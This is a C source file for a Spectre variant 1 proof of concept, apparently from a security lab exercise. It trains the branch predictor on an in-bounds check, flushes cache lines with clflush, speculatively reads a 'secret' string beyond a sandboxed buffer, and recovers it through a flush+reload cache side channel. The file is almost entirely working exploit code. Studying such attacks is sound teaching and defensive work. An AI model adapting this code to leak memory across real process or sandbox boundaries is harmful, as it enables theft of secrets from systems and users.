#include <emmintrin.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdio.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };
char *secret = "Some Secret Value";
uint8_t array[256 * 4096];

#include "flush-reload.h"

// Sandbox Function
uint8_t restrictedAccess(size_t x) {
	if (x <= bound_upper && x >= bound_lower) {
		return buffer[x];
	} else {
		return 0;
	}
}

void spectreAttack(size_t index_beyond) {
	int i;
	uint8_t s;
	volatile int z;
	// Train the CPU to take the true branch inside restrictedAccess().
	for (i = 0; i < 10; i++) {
		restrictedAccess(i);
	}
	// Flush bound_upper, bound_lower, and array[] from the cache.
	_mm_clflush(&bound_upper);
	_mm_clflush(&bound_lower);
	for (i = 0; i < 256; i++) {
		_mm_clflush(&array[i * 4096 + DELTA]);
	}
	for (z = 0; z < 100; z++) {
	}
	s = restrictedAccess(index_beyond);
	array[s * 4096 + DELTA] += 88;
}

int main() {
	flushSideChannel();
	size_t index_beyond = (size_t)(secret - (char *)buffer);
	printf("secret: %p \n", secret);
	printf("buffer: %p \n", buffer);
	printf("index of secret (out of bound): %ld \n", index_beyond);
	spectreAttack(index_beyond);
	reloadSideChannel();
	return (0);
}
